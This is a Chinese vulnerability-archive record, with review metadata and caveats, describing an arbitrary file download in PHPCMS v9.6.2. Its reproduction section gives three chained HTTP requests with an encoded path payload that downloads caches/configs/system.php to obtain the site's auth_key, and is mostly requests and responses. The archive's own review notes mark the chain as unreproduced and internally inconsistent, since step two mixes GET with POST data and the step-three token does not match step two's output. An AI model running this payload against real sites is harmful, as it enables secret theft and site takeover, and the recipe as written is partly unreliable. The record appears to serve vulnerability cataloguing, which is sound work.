---
source: "hatch 补库批 20260928"
product: "PHPCMS9.6.2"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Phpcms v9.6.2 任意文件下载"
prerequisites: "来源所述条件，未列明部分仍待核：Windows尾部非法字符路径处理、WAP/attachments/down端点可达"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-48ba719045a013b8b189258d"
entity_id: "ve-48ba719045a013b8b189258d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Windows尾部非法字符路径处理、WAP/attachments/down端点可达

- **适用与权限边界（1）**：正文没列Windows前提，%81后缀行为不可泛化Linux。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：第二步标GET却有POST DATA；第三步a_k与前一步给出的att_json不同，示例链不一致。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：加密Cookie/链接是站点临时值不可复用，实际应动态提取；原始响应/认证配置未列。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Phpcms v9.6.2 任意文件下载

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

##### 第一步:进行如下请求获得YDVIB\_siteid的值。

请求：

    [GET]http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=wap&c=index&a=init&siteid=1

获得：

    [cookie]YDVIB_siteid:75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst

##### 第二步:在\[POST DATA\] 中的userid\_flash参数的值设置为，第一步请求得到的YDVIB\_siteid参数的值，并进行如下请求。

请求：

    [GET] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&c=attachments&a=swfupload_json&src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%253ep%2581%26modelid=1%26d=1&aid=1

    [POST DATA] userid_flash=75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst

获得：

    [cookie] YDVIB_att_json:ea6fUlmiupVPoK2udMAztI7dpqUURRW1plemEGmRhGPocAvwWbcMk3BARFHzxLI4NJrV1IJQ2PaHeec790iDdhRJ9dJbhEKamgM55SwKR-F3fFmmWDOVuHnyiWg9kyMzQ2l9D_cRPQmM7P9e7ZYrESNQwjMOytrFTIhY4SFmK2Vjc3GS3g

##### 第三步:将GET请求中的a\_k参数的值设置为第二步请求获得的YDVIB\_att\_json参数的值，并进行如下请求。

请求：

    [get] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=init&a_k=41f4VsAhLvN8-4L1ntgSsuga4BrvYA5zcDo2bjiYB7RI98Qzj5D5k8dqqBfo7cUNwF3TGhz1SH-vPs3lIIQJYwHeF_u2b3QVfD2HIO3Gay68TAtz2rqYhX8XIeznWrTtOI24418KZUoTEAfnY4kZNtIajW-bqHRV1djqmEc1hSAwkIYWA9CPrw

获得：

    http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=download&a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM

##### 最后点击"点击下载"的按钮进行如下请求，便可以下载/caches/configs/system.php文件，得到里面的'auth\_key'

    http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&c=down&a=download&a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM

![](./.resource/Phpcmsv9.6.2任意文件下载/media/rId28.png)

参考链接
--------

> <https://www.freebuf.com/column/158352.html>
